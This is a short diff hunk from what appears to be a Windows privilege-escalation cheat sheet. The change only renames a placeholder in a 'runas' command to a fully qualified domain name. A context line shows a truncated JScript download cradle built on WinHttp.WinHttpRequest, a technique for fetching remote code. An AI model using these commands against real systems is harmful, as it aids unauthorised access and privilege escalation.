@@ -86,7 +86,7 @@ echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq
 ## run as over user
 #cat/PRIVESC
 ```
-runas /user:<domain>\<user> cmd.exe
+runas /user:<domain_fqdn>\<user> cmd.exe
 ```
 
 ## infos on a Administrator and retrieve SID
